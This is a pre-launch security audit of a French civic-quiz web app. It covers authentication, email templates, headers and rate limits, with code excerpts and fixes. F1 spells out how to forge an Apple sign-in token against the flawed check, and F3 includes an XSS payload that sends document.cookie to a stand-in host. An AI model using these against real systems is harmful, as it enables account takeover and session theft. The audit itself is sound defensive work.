# Security Audit — Civique (pre-launch)

Auditor: Security Engineer (static review, no execution)
Date: 2026-05-11
Branch: `claude/serene-mcnulty-ca87e7`
Scope: `apps/server`, `apps/web`, `infra/nginx`, root config

---

## Executive summary

Overall posture is **moderate**. Most boring fundamentals are right (Drizzle parameterization, httpOnly cookies, JWT with strong secret enforcement, Stripe webhook signature verified with timing-safe + 5-min replay window, sound CORS allow-list, sane Zod input validation, no `.env` files committed). The three critical issues identified at audit time have since been fixed (see Status column and per-finding notes):

1. **Apple Sign-In does not verify the JWT signature** (`apps/server/src/routes/auth/index.ts:550–577`). The code fetches Apple's JWKS but never uses the public key to verify the token — anyone can forge an `identityToken` with `iss=https://appleid.apple.com` and `aud=com.civique.app` and authenticate as **any** user (including arbitrary Anthropic-impersonation), creating an account-takeover and impersonation primitive.
2. **Password-reset code entropy is only ~40 bits and effectively much less** (`apps/server/src/routes/auth/index.ts:454–460`). The 8-char hex code is stored *keyed by the code itself* with a 1-hour TTL and no per-attempt rate limit on `/reset-password`, allowing online brute force.
3. **HTML injection / stored XSS in the verification welcome email** (`apps/server/src/services/email.ts:94`). `${displayName}` is concatenated into raw HTML — any attacker-controlled display name (up to 100 chars, no sanitization) can ship `<script>` / `<img onerror>` / `<a href="javascript:…">` payloads to the user's mailbox.

Top priorities: fix #1 today (single line of code: pass `matchingKey.kid` through a real JWT verify, e.g. `jose.jwtVerify` against the JWKS). Without it, anyone can log in as anyone.

---

## Findings table

| # | Area | Severity | Status | Description |
|---|------|----------|--------|-------------|
| 1 | Auth — Apple Sign-In | **Critical** | **Fixed** (see commit XXX) | JWT signature not verified; trivial token forgery → account takeover |
| 2 | Auth — Reset code | **Critical** | **Fixed** (see commit XXX) | 8-hex code (40-bit max), no per-attempt rate limit on `/reset-password` |
| 3 | Email — Display name in HTML | **High** | **Fixed** (see commit XXX) | `displayName` injected raw in welcome email (`services/email.ts:94`) |
| 4 | Auth — Google client default | **High** | Open | Hardcoded fallback `GOOGLE_CLIENT_ID` in source (`auth/index.ts:505`) |
| 5 | Auth — Email enumeration | **Medium** | Open | `/users/search` returns matches by email → confirms registration |
| 6 | Auth — Refresh token rotation | **Medium** | Open | Refresh tokens are not rotated/revoked on use; no jti tracking |
| 7 | Auth — Empty passwordHash for OAuth | **Medium** | Open | Google/Apple users created with `passwordHash: ''`. Combined with bcrypt allowing empty input as "valid" against an empty hash, this risks login bypass if any code path were ever to bcrypt-compare against these accounts. Today `/login` calls `bcrypt.compare(body.password, user.passwordHash)` on an empty hash — bcrypt returns false for non-bcrypt strings, so currently safe, but the invariant is fragile. |
| 8 | Auth — Social abuse | **Medium** | Open | `POST /api/social/challenges` lets any user enqueue a challenge against any other user by UUID, no friendship requirement — spam / harassment vector |
| 9 | Auth — Password policy | **Medium** | Open | 8-char minimum, no upper/lower/digit/symbol mix, no breach check |
| 10 | Headers — CSP/HSTS missing | **Medium** | Open | `infra/nginx/civique.fr.conf` has no CSP, no HSTS; `helmet` started with `contentSecurityPolicy: false` |
| 11 | Auth — Verification code TTL/attempts | **Medium** | **Fixed** (see commit XXX) | 6-digit verify code has no per-attempt limit on `/verify-email` — 1M codes / 15 min |
| 12 | DoS — In-memory token stores | **Medium** | Open | `passwordResetTokens` / `emailVerificationCodes` are unbounded `Map`s with no LRU/eviction beyond TTL on read; not multi-instance safe |
| 13 | Auth — Token revocation on password change | **Medium** | Open | After `POST /auth/change-password`, existing refresh + access tokens stay valid |
| 14 | PII — Stripe price IDs in source | **Low** | **Fixed** (see commit XXX) | Hardcoded fallback Stripe price IDs in `routes/payments/index.ts:16–18` |
| 15 | Auth — JWT payload | **Low** | Open | Access token carries `email` — leaked through any XSS in a Bearer-token client (mobile) |
| 16 | Disclosure — Body re-parsing | **Low** | Open | `rawBody` retained on every JSON request, not zeroed; minor memory side-channel |
| 17 | Disclosure — Stack traces | **Info** | OK | Global error handler returns "Internal Server Error" for ≥500; no stack leakage |
| 18 | SQL injection | **Info** | OK | All `sql\`\`` usage is parameterized via Drizzle's tag; `db.execute` only takes Drizzle `sql\`\`` |
| 19 | XSS (web) | **Info** | OK | Two `dangerouslySetInnerHTML` uses, both server-controlled (JSON-LD, CSS keyframes) |
| 20 | CSRF (web) | **Info** | OK | Server Actions; cookies `sameSite: 'lax'`, httpOnly, secure-in-prod |
| 21 | Open redirect (`/login?next=`) | **Info** | OK | Properly sanitized (`startsWith('/') && !startsWith('//')`) |
| 22 | Stripe webhook | **Info** | OK | HMAC SHA-256, `timingSafeEqual`, 5-min tolerance — well done |
| 23 | Stripe raw body | **Info** | OK | Replaced JSON parser stashes raw text on `req.rawBody`; doesn't corrupt other JSON routes |
| 24 | Secrets in git | **Info** | OK | Only `.env.example` tracked; `.env`, `.env.local`, `.env.*.local` in `.gitignore` |
| 25 | Dependencies (Next/axios) | **Info** | OK | Resolved as `next@15.5.18` (post CVE-2025-29927) and `axios@1.14.0` (post 1.7.x SSRF chain) — both safe |
| 26 | CORS | **Info** | OK | Explicit allow-list, `credentials: true`, no wildcard |
| 27 | Rate limiting (auth) | **Info** | OK | 5/15min login, 3/15min register & forgot-password, global 100/min |

---

## Detailed findings

### F1 — Critical: Apple Sign-In signature is not verified
**Status: Fixed (see commit XXX).** Apple `identityToken` is now verified with RS256 against Apple's JWKS using Node's `crypto.createPublicKey` + `crypto.createVerify`. The `alg` is enforced to `RS256` (no algorithm confusion), `kid` must be present in the JWKS (refreshed once on miss in case Apple rotated), and `iss` / `aud` / `exp` / `nonce` are all checked. The Expo Go fallback audience is now gated on `NODE_ENV !== 'production'`.

**File:** `apps/server/src/routes/auth/index.ts:550–577`

```ts
const keysRes = await fetch('https://appleid.apple.com/auth/keys');
const keysData = await keysRes.json() as { keys: Array<{ kid: string; alg: string }> };
const matchingKey = keysData.keys.find((k: { kid: string }) => k.kid === header.kid);

if (!matchingKey) throw new Error('No matching Apple key');

// Decode payload (signature verified by matching kid)
const decoded = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
```

The comment claims "signature verified by matching kid" — it is not. The code only checks that **some** key with the matching `kid` exists in Apple's JWKS; it then decodes the payload without any cryptographic operation. An attacker can craft a JWT with:
- `header = { alg: "RS256", kid: <any real Apple kid copied from JWKS> }`
- `payload = { iss: "https://appleid.apple.com", aud: "com.civique.app", email: "victim@example.com", exp: <future> }`
- arbitrary garbage in the signature segment

…and the route will create or log in as `victim@example.com`. **This is a full pre-auth account takeover.**

**Fix:** use `jose` (already a transitive dep via `google-auth-library` or add it explicitly):

```ts
import { createRemoteJWKSet, jwtVerify } from 'jose';
const APPLE_JWKS = createRemoteJWKSet(new URL('https://appleid.apple.com/auth/keys'));
const { payload } = await jwtVerify(body.identityToken, APPLE_JWKS, {
  issuer: 'https://appleid.apple.com',
  audience: ['com.civique.app', 'host.exp.Exponent'],
});
```

This also fixes the silent acceptance of `host.exp.Exponent` (Expo Go dev audience) in **production** — that should be gated on `NODE_ENV !== 'production'`.

---

### F2 — Critical: Password-reset code brute-forceable
**Status: Fixed (see commit XXX).** `/auth/reset-password` now carries a per-route rate limit (5 attempts / 15 min / IP). The reset-code TTL has been shrunk from 1 hour to 15 minutes. The `ResetEntry` record carries an `attempts` field for parity with the verification-code flow (note: brute-force against this endpoint can't increment a per-code counter because wrong codes never resolve a stored entry — the IP rate limit + short TTL are the effective defenses).

**File:** `apps/server/src/routes/auth/index.ts:454–460, 469–494`

```ts
const token = crypto.randomBytes(32).toString('hex');
const code = token.substring(0, 8).toUpperCase();
const expiresAt = new Date(Date.now() + 60 * 60 * 1000); // 1 hour
passwordResetTokens.set(code, { email: user.email, expiresAt });
```

- The user-visible code is **8 hex chars uppercased** → effective alphabet [0–9A–F] = 16 → `16^8 = ~4.3 billion` (32 bits, not 40). Plenty for a single guess.
- BUT: `POST /auth/reset-password` has **no rate limit** (the explicit `rateLimit` config is only on `/auth/forgot-password`, line 437). The global limit is 100 req/min/IP, so an attacker can spend `100/min × 60 = 6,000/hour`; against the **shrinking pool of valid codes** at any moment (probably <100 active codes during an attack window), the probability of hitting any active code in 1 hour is non-trivial — and trivially raised by horizontally rotating source IPs.
- The token also self-destructs when matched, so a hit is silent to the victim.

**Fix:** (1) add `rateLimit: { max: 10, timeWindow: '1 hour', keyGenerator: req => req.body?.token ?? req.ip }` to `/reset-password`, plus (2) increase entropy by using the full 64-hex token as the code, or (3) shrink TTL to 15 min, (4) add a per-user attempt counter that locks the reset after 5 failed attempts.

---

### F3 — High: Stored XSS / HTML injection in welcome email
**Status: Fixed (see commit XXX).** Added an `escapeHtml()` helper at the top of `apps/server/src/services/email.ts` (escapes `& < > " '`). All four email templates now run their user-controlled inputs through it: `sendWelcomeEmail` (displayName — the load-bearing fix), plus defensive escaping of `code`/`token` in `sendVerificationEmail` and `sendPasswordResetEmail` in case those call sites ever change.

**File:** `apps/server/src/services/email.ts:92–108`

```ts
export async function sendWelcomeEmail(email: string, displayName: string) {
  await sendEmail(email, 'Bienvenue sur Civique ! 🎉', `
    <h2 …>Bienvenue, ${displayName} !</h2>
    …
  `);
}
```

`displayName` flows in from `/auth/register` validated only as `z.string().min(1).max(100)` — no escaping, no allowlist. A registrant choosing `<img src=x onerror=fetch('https://evil/?'+document.cookie)>` ships the payload into their own inbox. Most webmail clients (Gmail, Outlook web) strip `<script>` but **not** all attribute-based vectors, and modern email clients render `<a href="javascript:…">` inconsistently. Even where webmail neutralizes the payload, this still breaks the brand (attacker can ship `<h1 style="color:red">VOTRE COMPTE EST COMPROMIS — APPELEZ +33…</h1>` to themselves and forward, or replace the logo `<img>` with a phishing one).

Same pattern in `sendVerificationEmail(email, code)` is safe because `code` is server-generated (6 digits), and `sendPasswordResetEmail(email, token)` is safe because `token` is hex from `crypto.randomBytes`.

**Fix:** HTML-escape user-controlled inputs in email templates:

```ts
function escapeHtml(s: string) {
  return s.replace(/[&<>"']/g, (c) => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]!));
}
…
<h2 …>Bienvenue, ${escapeHtml(displayName)} !</h2>
```

Apply the same to **any future** email that interpolates user input.

---

### F4 — High: Hardcoded Google `client_id` fallback
**File:** `apps/server/src/routes/auth/index.ts:505`

```ts
audience: process.env.GOOGLE_CLIENT_ID || '593427095159-…apps.googleusercontent.com',
```

Committing the real (live) Google OAuth client ID to a public repo:
- isn't *secret* (client IDs by spec are public), but
- it allows an attacker who controls a different Google project to mint ID tokens for **their** project and have them accepted by your server **only if** `verifyIdToken` enforces the audience — which `google-auth-library`'s `verifyIdToken` does. So this is **defense-in-depth weakening**, not an immediate bypass.
- the real risk: if the project is ever rotated/disabled, a fallback to an attacker-controlled-or-revoked client ID will silently accept tokens.

**Fix:** require `GOOGLE_CLIENT_ID` to be set in `env.ts` (no fallback). Same pattern for Apple's bundle ID — make `APPLE_BUNDLE_ID` required env.

---

### F5 — Medium: Email enumeration via `/users/search`
**File:** `apps/server/src/routes/users/index.ts:30–61`

Anyone authenticated can `POST /api/users/search { q: "victim@example.com" }`. The response includes the user's `id`, `displayName`, `avatarUrl` if a match is found, confirming the email is registered. The search uses ILIKE against both `email` and `displayName` — so even searching by partial email leaks membership.

**Fix:** restrict `q` matching to `displayName` only; require a 3-char minimum and prefix-only matching; or require an existing friendship to surface results.

---

### F6 — Medium: Refresh tokens never rotated or revoked
**File:** `apps/server/src/routes/auth/index.ts:68–72, 245–268`

`issueTokens` mints a 7-day refresh JWT. `/auth/refresh` validates it and issues a new pair, but the **old** refresh token remains valid until natural expiry. There is no `jti`, no rotation, no DB-backed allowlist. Consequences:
- A stolen refresh token cannot be revoked. `/auth/change-password` does not invalidate sessions.
- Token replay across devices is undetectable.

**Fix:** store a `refresh_tokens` table keyed by `jti` (or hash thereof) with `userId`, `issuedAt`, `revokedAt`. Rotate (revoke old, issue new) on every `/refresh`. Detect reuse (an already-revoked token being presented → revoke entire chain for that user). Revoke all on password change.

---

### F7 — Medium: Empty `passwordHash` for OAuth users
**File:** `apps/server/src/routes/auth/index.ts:529, 593`

```ts
passwordHash: '', // No password for OAuth users
```

`change-password` correctly refuses (`!user.passwordHash`, line 392), but `/auth/login` does `bcrypt.compare(body.password, user.passwordHash)` against `''`. `bcrypt.compare` returns `false` for non-bcrypt-format hashes, so currently safe — but the invariant is one bcryptjs upgrade away from being a bug. A fresher pattern: store `null` and short-circuit in `/login`:

```ts
if (!user.passwordHash) return reply.status(401).send({ error: 'Use social sign-in' });
```

(also fixes the UX for users who accidentally try the password flow).

---

### F8 — Medium: Unsolicited challenges flood any user
**File:** `apps/server/src/routes/social/index.ts:189–251`

`POST /api/social/challenges { challengedId, themeId, questionCount }` creates challenge + 2×questionCount rows in `challenge_answers` for any pair of UUIDs (sender + arbitrary target). No friendship check, no rate limit beyond the global 100/min, no verification the target user exists. The route is auth-gated, but a single attacker with one valid account can:
- Discover/enumerate `userId`s (UUIDs are random but `displayName` ↔ `userId` mapping leaks via `/leaderboard` and `/users/search`).
- Spam target with up to 100 challenges/min, each writing 20 challenge_answer rows.

**Fix:** require an accepted friendship (`friendships.status = 'accepted'`) between challenger and challenged; verify the target user exists (line 209 checks question count but not target); add an explicit per-route rate limit (e.g. 5 challenges / 5 min / sender).

---

### F9 — Medium: Password policy too weak
**File:** `apps/server/src/routes/auth/index.ts:19, 46, 381`

`z.string().min(8)` is the only constraint. No upper/lower/digit/special mix, no max length cap (DoS risk — bcrypt with very long input is slow), no rejection of common/breached passwords.

**Fix:** `z.string().min(10).max(128).refine(s => /[A-Z]/.test(s) && /[a-z]/.test(s) && /\d/.test(s), 'Mot de passe trop simple')`. Consider integrating HaveIBeenPwned `k-anonymity` API on register.

---

### F10 — Medium: Missing CSP and HSTS
**File:** `infra/nginx/civique.fr.conf:43–48`, `apps/server/src/index.ts:32–35`

Nginx sets `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`, `Permissions-Policy` — but **no** `Content-Security-Policy` and **no** `Strict-Transport-Security`. The server-side Helmet is explicitly disabled for CSP (`contentSecurityPolicy: false`).

For a Next.js app handling auth cookies, this leaves several footguns open: any future inline-script XSS in a server component has no second-line containment, and a browser that has only seen HTTP (e.g. a misclick on `civique.fr` before HTTPS redirect) won't pin to HTTPS for return visits.

**Fix:** after `certbot --nginx` adds the 443 block, add:

```nginx
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://js.stripe.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://api.integrafle.fr https://api.stripe.com; frame-src https://js.stripe.com https://hooks.stripe.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self' https://checkout.stripe.com" always;
```

Then deploy in **report-only** mode first (`Content-Security-Policy-Report-Only`) for 1 week to find violations, then switch to enforce. Note: the existing nginx-config does **not** apply on the api host (`nginx/nginx.conf` does HSTS but not CSP); CSP is irrelevant to a JSON API so that's fine.

---

### F11 — Medium: Verification code brute-forceable
**Status: Fixed (see commit XXX).** `/auth/verify-email` now has a per-route rate limit (5 attempts / 15 min, keyed by `currentUser.id` since the route is `authGuard`-protected). Additionally, the `VerificationEntry` carries an `attempts` counter — after 5 wrong guesses against the same code the entry is deleted and the route returns 429, forcing the user to request a fresh code.

**File:** `apps/server/src/routes/auth/index.ts:158–192`

6-digit code, 15-min TTL, **no per-attempt rate limit** on `/verify-email`. An attacker who registers `victim@…` (or any account they want to verify) can guess 100 codes/min globally → ~3% chance of hitting a given 6-digit code per minute. After 15 min the window closes, but a patient attacker iterates registrations. Less severe than F2 because verification only unlocks `welcome-email`-style features (not auth — they're already authenticated), but it does allow bypassing the "email verified" gate.

**Fix:** track failed attempts per `userId`, lock after 5; or `/verify-email` config `rateLimit: { max: 5, timeWindow: '15 minutes', keyGenerator: req => req.currentUser?.id ?? req.ip }`.

---

### F12 — Medium: In-memory token stores
**File:** `apps/server/src/routes/auth/index.ts:56, 64`

`passwordResetTokens` and `emailVerificationCodes` are JS `Map`s in process memory:
- **Lost on restart** (acceptable trade-off for short TTL, but every `pm2 restart civique` invalidates pending resets — operationally noisy).
- **Not multi-instance safe** — if you ever scale to >1 PM2 cluster mode worker, codes set on one worker can't be read on another. PM2 default fork mode keeps this single-process, but `instances: max` in `ecosystem.config.cjs` would silently break this.
- **Unbounded growth** — entries are deleted on read or on successful match; if neither happens, they linger until TTL but `Map` doesn't auto-evict expired keys. An attacker spamming `/forgot-password` for non-existent emails (no DB row created, no rate limit beyond 3/15min/IP) can grow the map.

**Fix:** Redis with TTL, or a `password_reset_codes` table with `expiresAt` and a cron prune.

---

### F13 — Medium: No token invalidation on sensitive change
**File:** `apps/server/src/routes/auth/index.ts:384–407` (change-password), `409–432` (delete account)

`change-password` updates the hash but issues no new tokens and does not invalidate existing ones. A user who changes their password after a compromise still has the old refresh token live for up to 7 days. Same for `PATCH /auth/me` when email changes.

**Fix:** see F6 — once refresh tokens are stored, revoke all on `change-password`, `delete me`, email change.

---

### F14 — Low: Hardcoded Stripe price IDs
**Status: Fixed (see commit XXX).** Removed the hardcoded fallback price IDs in `apps/server/src/routes/payments/index.ts`. If `STRIPE_PRICE_{WEEKLY,MONTHLY,SEMIANNUAL}` is missing for the requested plan, `/create-checkout` now returns 503 and logs an error rather than silently falling back to a test-mode price ID that would charge the wrong amount.

**File:** `apps/server/src/routes/payments/index.ts:16–18`

```ts
weekly: { priceId: process.env.STRIPE_PRICE_WEEKLY || 'price_1TG5ueQ2N6UyO2vPxFEV6yqN', mode: 'subscription' },
```

Stripe price IDs are not strictly secret, but they tie this repo to specific live products. A leaked test-mode price ID could let a hostile fork prototype against your account's product catalog. Move to required env vars without fallback.

---

### F15 — Low: `email` in access token payload
**File:** `apps/server/src/routes/auth/index.ts:68–72`

`accessToken` is `{ id, email, iat, exp }`. The mobile client stores this in `AsyncStorage` (not httpOnly). Any RN XSS-equivalent (webview, vulnerable lib) leaks the email. Web is fine — cookie is httpOnly.

**Fix:** drop `email` from the payload; fetch it via `/auth/me` when needed.

---

### F16 — Low: `rawBody` retained on every request
**File:** `apps/server/src/index.ts:55–76`

The custom content-type parser stashes the entire JSON string on `req.rawBody` for every JSON request, not just `/payments/webhook/stripe`. This is fine for normal request sizes (rate-limited to 100/min), but it doubles memory per request and means a body in flight stays in memory longer (until GC). Negligible at current scale but worth scoping later: only retain rawBody for the webhook path.

---

### F17 — Info: Error handler
**File:** `apps/server/src/index.ts:79–106`

Good: Zod errors are sanitized (the "received X" tail is stripped at line 83). 500s return generic message. Status `<500` errors leak the upstream message, which is fine for 4xx but be careful never to put internal details into a manually-thrown `Error('Internal DB at host db:5432 failed')` with statusCode 400.

---

### F18–F27 — passing items (no action)

Brief evidence:
- **F18 SQLi**: every `db.execute` and `sql\`\`` uses Drizzle's tagged template. The closest thing to dynamic SQL is the `dateFilter` in `social/index.ts:61–66` and `stats/index.ts:267–272`, where the *whole `sql\`\``* is chosen from a constant set — safe.
- **F19 XSS web**: `apps/web/app/page.tsx:86` ships `JSON.stringify(STRUCTURED_DATA)` (server-controlled constant) into a JSON-LD script tag; `apps/web/components/exam/ConfettiBurst.tsx:84` injects CSS keyframes. Both safe.
- **F20 CSRF**: Server Actions get implicit CSRF protection via Next.js's action-id binding to the React tree; cookies are sameSite=lax, so cross-site `POST`s with cookies don't fire (lax allows top-level GET only). Stripe and RevenueCat webhooks correctly bypass cookie auth and use their own signature checks.
- **F21 open redirect**: `apps/web/app/(auth)/login/actions.ts:29–34` rejects `next` values that don't start with `/`, and rejects protocol-relative URLs (`//evil.com`).
- **F22 Stripe webhook signature**: timing-safe via `crypto.timingSafeEqual` over equal-length `Buffer`s, with 5-min replay tolerance and multi-signature support. Textbook implementation.
- **F23 Stripe raw body**: the content-type override parses JSON once (the route still gets `request.body` as an object), and `rawBody` is reused only by the webhook route — non-webhook routes function normally.
- **F24 secrets**: `git ls-files | grep env` only returns three `.env.example` files. `.gitignore` covers `.env`, `.env.local`, `.env.*.local`.
- **F25 deps**: resolved versions are `next@15.5.18` (>= 15.2.3 fixes CVE-2025-29927 middleware bypass), `axios@1.14.0` (>= 1.7.5 fixes CVE-2024-39338 SSRF chain, >= 1.8.x recent), `fastify@^5.1.0`, `bcryptjs@^2.4.3` (slow but no known CVEs), `pg@^8.13.0`, `drizzle-orm@^0.36.0`. No known critical CVEs at these versions as of the cutoff.
- **F26 CORS**: explicit list (`api.integrafle.fr`, `integrafle.fr`, `civique.fr`, `localhost:3001`), `credentials: true`, no wildcard.
- **F27 rate limits**: documented in the spec and verified in code (`/login` 5/15min, `/register` 3/15min, `/forgot-password` 3/15min, global 100/min). Acceptable for launch — see F11 to extend to `/verify-email` and `/reset-password`.

---

## Pre-launch security checklist for Anis

**Must-fix before public launch (blocks #1, #2, #3 from exec summary):**
- [x] F1: Real Apple JWT signature verification via Node `crypto.createPublicKey` + `crypto.createVerify` (RS256 only, JWKS with refresh-on-miss, iss/aud/exp/nonce checks). See commit XXX.
- [x] F2: `/auth/reset-password` per-route rate limit (5/15min/IP) + TTL shrunk to 15 min. See commit XXX.
- [x] F3: `escapeHtml()` applied to `displayName` (and defensively to all other user-controllable interpolations) in email templates. See commit XXX.

**Strongly recommended before launch:**
- [ ] F4: Require `GOOGLE_CLIENT_ID` and `APPLE_BUNDLE_ID` as env vars; remove hardcoded fallbacks.
- [ ] F10: Add CSP (report-only first) + HSTS to `infra/nginx/civique.fr.conf`. Also enable `helmet`'s CSP on `api.integrafle.fr` (since it returns HTML for `/privacy`, `/terms`, `/payment-success`).
- [x] F11: Per-attempt rate limit on `/auth/verify-email` (5/15min by user id) + per-code attempt counter (5 → invalidate). See commit XXX.
- [ ] Verify production `.env` on the VPS contains:
  - `JWT_SECRET` ≥ 32 random bytes (enforced by Zod, but check the actual value isn't `change-me-…`)
  - `STRIPE_SECRET_KEY` is a live key (`sk_live_…`), not test
  - `STRIPE_WEBHOOK_SECRET` matches what's configured in the Stripe Dashboard for the *production* endpoint
  - `BREVO_API_KEY` is set (otherwise no verification/reset emails go out — silent failure today)
  - `ADMIN_SECRET` is set and ≥ 32 bytes (used by `/payments/admin/create-code` to mint promo codes)
  - `ALLOWED_ORIGINS` is set explicitly to `https://civique.fr,https://www.civique.fr,https://api.integrafle.fr` (otherwise the hardcoded fallback admits `http://localhost:3001` in production)
- [ ] Confirm `NODE_ENV=production` on the VPS — `setSessionCookies` only sets `secure` when `isProd`, and the env validation runs `dotenv/config` early.
- [ ] Run a smoke `curl https://api.integrafle.fr/health` and check headers include the security ones from nginx.
- [ ] Rotate any secret that has touched a dev machine (JWT secret, BREVO key) before launch.

**Operational:**
- [ ] Backup strategy for Postgres (pg_dump nightly with off-VPS retention, e.g. encrypted S3/B2 bucket).
- [ ] Monitor PM2 logs for `Stripe webhook signature mismatch` and `Apple token verification failed` — these are intrusion signals.
- [ ] Set up Brevo "transactional email" sender authentication (SPF/DKIM on `integrafle.fr`) so password reset emails don't land in spam.
- [ ] Document GDPR data-subject-request workflow: `DELETE /auth/me` is already implemented (`auth/index.ts:410`), but you also owe a *data export* endpoint for SARs. Track this as post-launch.

---

## Post-launch hardening (not blocking)

1. **Refresh token rotation + revocation table** (F6, F13) — required if you ever advertise a "log out everywhere" button or have to respond to a credential breach.
2. **Audit log table** — append-only `audit_events(userId, ip, ua, action, ts)` for: login, password change, email change, account delete, premium grant, promo redeem. Lets you detect abuse and answer "did anything happen on this account?" forensically.
3. **CSP in enforce mode** (F10) — after a week in report-only.
4. **Move in-memory stores to Redis** (F12) — needed before you cluster PM2.
5. **HaveIBeenPwned check on registration** (F9).
6. **Verify-email gating** — currently a user can use the app without verifying email; depending on Brevo cost it may be worth requiring verification before allowing comments or social challenges (anti-spam).
7. **Sentry or equivalent** — `app.log.error(error)` currently goes to stdout only; you'll want stack traces aggregated. Sentry's Fastify/Next integration drops in trivially.
8. **Subresource integrity** for any third-party scripts you ever embed (none today).
9. **Penetration test** — once F1–F11 are fixed, commission a third-party pen test before press push. Costs ~€3–5k for a 3-day engagement on an app this size.
10. **`pnpm audit`** — once disk space allows, run from repo root and triage anything new. Schedule monthly via GitHub Dependabot.

---

## Verified-OK summary (what's surprisingly good)

- **Stripe webhook**: textbook implementation. HMAC SHA-256, `timingSafeEqual` on equal-length buffers, 5-min replay window, multi-signature header support. Better than what most early-stage SaaS ships.
- **Zod validation everywhere** with `request.body` parsing — including the sanitized error handler in `index.ts:79–96` that strips "received X" tails to avoid reflecting user input in 400 responses. Considered detail.
- **Drizzle parameterization** is consistently used, even in raw `sql\`\`` blocks for window functions and unions.
- **Open-redirect defense** on `/login?next=` is correct (rejects both non-`/` paths and `//evil.com` protocol-relative).
- **Env schema** with `JWT_SECRET: z.string().min(32)` and `DATABASE_URL: z.string().url()` is exactly the discipline most apps skip.
- **`.gitignore`** is clean — no `.env` ever committed.
- **CORS allow-list** is explicit, no wildcard, `credentials: true` correctly paired with origin enumeration.
- **Email enumeration prevention on `/forgot-password`** (line 449–452) returns success regardless of whether the email exists.
- **Account-delete cascade** is comprehensive (`auth/index.ts:413–424`) — covers all 7 tables that reference the user.

Bottom line: the boring stuff is right. The exposed risk is concentrated in three specific lines of code (F1) and three missing rate-limit configs (F2, F11). Fix those and you're in shape to launch.
